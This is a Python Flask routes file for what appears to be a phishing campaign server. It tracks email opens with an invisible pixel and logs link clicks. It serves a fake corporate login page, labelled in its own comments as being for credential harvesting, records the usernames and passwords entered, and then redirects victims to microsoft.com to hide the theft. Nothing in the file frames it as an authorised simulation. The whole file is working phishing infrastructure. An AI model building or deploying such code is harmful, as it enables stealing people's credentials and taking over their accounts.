#!/usr/bin/env python3
"""
Flask routes for tracking server
"""

import base64
from flask import request, redirect
from tracking.tracker import Tracker
from tracking.analytics import Analytics
from templates.landing_pages import LandingPages

class Routes:
    """Define Flask routes"""
    
    def __init__(self, app, tracker: Tracker, analytics: Analytics):
        self.app = app
        self.tracker = tracker
        self.analytics = analytics
        self.landing_pages = LandingPages()
        
        self._register_routes()
    
    def _register_routes(self):
        """Register all routes"""
        
        @self.app.route('/track/<token>.png')
        def track_pixel(token):
            """Track email opens via invisible pixel"""
            token = token.replace('.png', '')
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', '')
            
            self.tracker.track_event(token, 'email_opened', ip, user_agent)
            
            # Return 1x1 transparent PNG
            pixel = base64.b64decode(
                'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
            )
            return pixel, 200, {'Content-Type': 'image/png'}
        
        @self.app.route('/click/<token>')
        def track_click(token):
            """Track link clicks and redirect"""
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', '')
            
            self.tracker.track_event(token, 'link_clicked', ip, user_agent)
            
            # Redirect to credential harvesting page
            return redirect(f'/login?t={token}')
        
        @self.app.route('/login')
        def login_page():
            """Fake login page for credential harvesting"""
            token = request.args.get('t', '')
            return self.landing_pages.corporate_login(token)
        
        @self.app.route('/submit', methods=['POST'])
        def submit_credentials():
            """Capture submitted credentials"""
            token = request.form.get('token', '')
            username = request.form.get('username', '')
            password = request.form.get('password', '')
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', '')
            
            # Log credentials
            self.tracker.track_credentials(token, username, password)
            self.tracker.track_event(token, 'credentials_submitted', ip, user_agent)
            
            # Redirect to real site
            return redirect('https://www.microsoft.com/')
        
        @self.app.route('/stats')
        def show_stats():
            """Display campaign statistics"""
            stats = self.analytics.get_campaign_stats()
            return self.landing_pages.stats_page(stats)